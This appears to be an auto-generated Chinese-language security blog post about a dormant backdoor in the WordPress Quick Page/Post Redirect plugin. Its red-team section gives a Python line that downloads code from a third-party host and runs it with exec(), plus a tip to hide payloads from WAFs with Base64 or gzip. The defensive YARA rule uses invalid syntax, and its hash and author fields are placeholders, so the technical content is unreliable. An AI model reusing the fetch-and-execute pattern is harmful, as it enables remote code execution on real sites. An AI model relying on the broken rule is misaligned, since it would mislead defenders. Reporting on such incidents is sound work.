---
layout: post
title:  "Popular WordPress redirect plugin hid dormant backdoor for years"
date:   2026-04-30 02:14:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 WordPress Quick Page/Post Redirect 外掛的隱藏後門

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Remote Code Execution (RCE)
> * **關鍵技術**: Arbitrary Code Execution, Self-Update Mechanism, Backdoor

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Quick Page/Post Redirect 外掛的 5.2.1 和 5.2.2 版本中包含了一個隱藏的自更新機制，允許從第三方域名 `anadnet[.]com` 下載和執行任意代碼。
* **攻擊流程圖解**:
	+ User Installs Plugin -> Plugin Downloads Malicious Update from `anadnet[.]com` -> Malicious Update Installs Backdoor
* **受影響元件**: WordPress Quick Page/Post Redirect 外掛 5.2.1 和 5.2.2 版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要安裝 Quick Page/Post Redirect 外掛 5.2.1 或 5.2.2 版本
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載惡意更新
    response = requests.get('http://anadnet[.]com/malicious_update.php')
    
    # 執行惡意更新
    exec(response.content)
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼或 gzip 壓縮來隱藏惡意代碼

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
	+ Hash: `md5sum` of malicious update
	+ IP: `anadnet[.]com` 的 IP 地址
	+ Domain: `anadnet[.]com`
	+ File Path: `/wp-content/plugins/quick-page-post-redirect/malicious_update.php`
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule QuickPagePostRedirect_MaliciousUpdate {
        meta:
            description = "Detects malicious update for Quick Page/Post Redirect plugin"
            author = "Your Name"
        strings:
            $malicious_update = "http://anadnet[.]com/malicious_update.php"
        condition:
            $malicious_update in (http.request.uri)
    }
    
    ```
* **緩解措施**: 卸載 Quick Page/Post Redirect 外掛並安裝乾淨的 5.2.4 版本

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Backdoor (後門)**: 想像一個秘密入口，允許攻擊者在未經授權的情況下存取系統。技術上是指一種允許攻擊者遠程存取和控制系統的機制。
* **Self-Update Mechanism (自更新機制)**: 想像一個程序可以自動下載和安裝更新。技術上是指一種允許軟件在未經用戶干預的情況下下載和安裝更新的機制。
* **Arbitrary Code Execution (任意代碼執行)**: 想像一個程序可以執行任意代碼。技術上是指一種允許攻擊者在系統上執行任意代碼的機制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/popular-wordpress-redirect-plugin-hid-dormant-backdoor-for-years/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


